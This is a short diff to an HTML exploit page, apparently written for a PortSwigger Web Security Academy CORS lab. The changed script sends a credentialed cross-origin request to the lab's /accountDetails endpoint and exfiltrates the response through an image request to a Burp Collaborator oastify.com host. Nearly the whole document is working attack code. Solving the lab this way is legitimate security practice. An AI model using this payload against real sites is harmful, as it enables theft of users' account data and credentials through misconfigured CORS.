@@ -1,5 +1,21 @@
+<!DOCTYPE html>
 <html>
-<script>
-var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0a08008203467afb82b39d1e002400a5.web-security-academy.net/accountDetails',true); req.withCredentials = true; req.send('{}'); function reqListener() { alert(this.responseText); };
-</script>
+<head>
+    <script>
+        var req = new XMLHttpRequest();
+        req.onload = reqListener;
+        req.open('GET', 'https://0a08008203467afb82b39d1e002400a5.web-security-academy.net/accountDetails', true);
+        req.withCredentials = true;
+        req.send();
+
+        function reqListener() {
+            // Send the response data to your Burp Collaborator server
+            var img = new Image();
+            img.src = 'https://je11mp6q8tm2jlalu7947ftpwg27q0toi.oastify.com/?data=' + encodeURIComponent(this.responseText);
+        }
+    </script>
+</head>
+<body>
+    <h1>Exploit Page</h1>
+</body>
 </html>
